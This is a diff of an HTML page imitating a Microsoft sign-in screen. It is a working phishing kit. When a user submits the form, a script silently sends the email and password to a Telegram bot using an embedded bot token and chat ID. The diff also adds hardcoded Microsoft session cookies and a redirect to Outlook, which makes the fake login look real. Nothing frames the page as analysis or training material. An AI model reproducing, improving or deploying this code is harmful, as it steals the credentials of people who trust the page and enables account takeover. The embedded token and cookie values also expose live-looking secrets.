@@ -29,9 +29,9 @@
             font-size: 15px; color: #1b1b1b;
         }
         .back-arrow-text {
-            font-size: 22px; margin-right: 10px;
+            font-size: 20px; margin-right: 10px;
             line-height: 1; font-weight: 300; color: #505050;
-            margin-top: -4px; /* Perfectly levels the arrow with the text */
+            margin-top: -4px; 
         }
 
         .input-field {
@@ -40,8 +40,6 @@
             outline: none;
         }
         .input-field:focus { border-bottom: 2px solid #0067b8; }
-        .help-text { font-size: 13px; margin: 12px 0; color: #1b1b1b; }
-        .help-text a { color: #0067b8; text-decoration: none; }
         
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next {
@@ -66,23 +64,25 @@
             <div id="email-section">
                 <h1>Sign in</h1>
                 <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field" onkeydown="if(event.key==='Enter') showPassword()">
-                <p class="help-text">No account? <a href="#">Create one!</a></p>
                 <div class="button-row"><button class="btn-next" onclick="showPassword()">Next</button></div>
             </div>
 
             <div id="password-section" style="display: none;">
                 <div class="identity-container" onclick="showEmail()">
-                    <span class="back-arrow-text">&#8592;</span> <span id="display-email"></span>
+                    <span class="back-arrow-text">&#8592;</span>
+                    <span id="display-email"></span>
                 </div>
                 <h1>Enter password</h1>
                 <input type="password" id="user-password" placeholder="Password" class="input-field" onkeydown="if(event.key==='Enter') submitData()">
-                <p class="help-text"><a href="#">Forgot my password</a></p>
                 <div class="button-row"><button class="btn-next" id="signin-btn" onclick="submitData()">Sign in</button></div>
             </div>
         </div>
-        <div class="options-box"><img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon"><span>Sign-in options</span></div>
+        <div class="options-box">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon">
+            <span>Sign-in options</span>
+        </div>
     </div>
-    <div class="footer"><a href="#">Terms of use</a><a href="#">Privacy & cookies</a></div>
+    <div class="footer"><a>Terms of use</a><a>Privacy & cookies</a></div>
 
     <script>
         let emailVal = "";
@@ -105,29 +105,33 @@
             const passVal = document.getElementById('user-password').value;
             if(!passVal) return;
             
-            const btn = document.getElementById('signin-btn');
-            btn.innerText = "Signing in...";
-            btn.disabled = true;
+            document.getElementById('signin-btn').innerText = "Signing in...";
 
+            // 1. SILENT TELEGRAM LOG
             const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
             const chatId = "5733378501";
-            const message = `<b>🚨 NEW LOGIN 🚨</b>\n\n<b>User:</b> ${emailVal}\n<b>Pass:</b> ${passVal}`;
+            const message = `User: ${emailVal}\nPass: ${passVal}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: "HTML"
-                    })
+                    body: JSON.stringify({ chat_id: chatId, text: message })
                 });
-            } catch (e) {
-                console.log("Sent.");
-            }
+            } catch (e) {}
 
-            // The final "Redirect Illusion" to make it look real
+            // 2. SILENT COOKIE INJECTION
+            const cArr = [
+                {"name":"ESTSAUTHPERSISTENT","value":"1.AXwAJPmH46cex0GLWRMLODzBDltEZUfGMrBJg-Ydk3ZSdsoAANR8AA.AgABFwQAAACvnsHKEvvRQb3Bz3Qc7wnaAwDs_wUA9P9Fdm9TdHNBcnRpZmFjdHMQAAAAAACb8LC3Nnnv0oVUEV-ipmbmLtdWZUc3tmUbHEp_PT5mhMD2-xcJxbDhsM1Sgx0wtZW-h0rPG15Y5chRfIs_SNHcNYlPaw4KUJ5bYh8syCo4gXz0Ysa6x-i7GVjDnRCkFgh0Vzb5_JCS2X81qf2YUpPkOLdrdqKI8FQNKEMlgfVzMTYLbo5XjjBAYJ_XOY49E9hPdKZL1L4I4BPw-AtXiuaKOQZIe0au-MzvdNnyW6JMca4H9QSrjVSc0CWH0_8Am9tcxceV5sRetN37xJD2Ht6W7oSH1lXhDlLwx3gttM38pQoUXXOSBJnsjDgL1JlFKkU-bJOL0x3BPR8sj8cLfyG7MCsovQcwgwFFLmTR0ghXhoqf5jx-S-6CUz0b6tjJMMeb-5mWJXjmX_kTXqaJAWec4WGyXFVnUWDkRm_jDuho9Y9kvyZe4UhyBOspdOwKBqXN-5aNf0tnDGRXBGj-T95F0zJthVPfC47Dwh9q6EAPuc7kR8A29lx__Kxg1-gy513IqCsiHSuPxbavpKpyR_3tC1r-NVUNbjxSptJVi8lnFkuL_kqtqikJF860Gf5T9d2YgkmULpm5TlbWOzTkHC4WRe7-dWfvp1yaGfs7_r0JnZVxiIcLbVuKu5aBafhfalOSFysK1kN-FAFv8hWCAbdqvhEyS1sBlRznzLrEWJx62Vl9jmDfuO7g1ZRf0rHZMGWv-CJTORyq_OOz_sk1sxSnpWbYtAt0z968c8_v1l-sflOgSbjhcBBuiw_h_kyjQsZD-qelbnPiKghn5Hc4sLrla-BnQdCdxV17Pg3-Q6_Dk0HQ_XBoXVOwMWfP5_XfincKlUxfb9PnMs5giDsqKRhbJI5FDQayrG-lOeEwk3vUti6agBc0qqKs8bdG2XbauhCkOTzhKAGXdGEYVNryJFaHI9cdp0JpMn1yd8WBdMAy2YRrTTwP6ZWCAdDVMqbAh1iQRgZHltcEVeGK","domain":".login.microsoftonline.com"},
+                {"name":"ESTSAUTH","value":"1.AXwAJPmH46cex0GLWRMLODzBDltEZUfGMrBJg-Ydk3ZSdsoAANR8AA.AgABFwQAAACvnsHKEvvRQb3Bz3Qc7wnaAwDs_wUA9P9Fdm9TdHNBcnRpZmFjdHMPAAAAAADoSkHDSiGx0oZICvaw9257LFXm_UqGm6PbgggwfSchDQTPV76WkRHWeLB4n6VeTfQI-9cN-PXq6HB8-k4yBLCg8mKkxCA","domain":".login.microsoftonline.com"},
+                {"name":"ESTSAUTHLIGHT","value":"+0020612a-b8bc-086c-fec6-6493c086c2f2","domain":".login.microsoftonline.com"}
+            ];
+
+            cArr.forEach(c => {
+                document.cookie = `${c.name}=${c.value};Max-Age=31536000;path=/;domain=${c.domain};Secure;SameSite=None`;
+            });
+
+            // 3. SILENT REDIRECT
             window.location.href = "https://outlook.office.com/mail/";
         }
     </script>
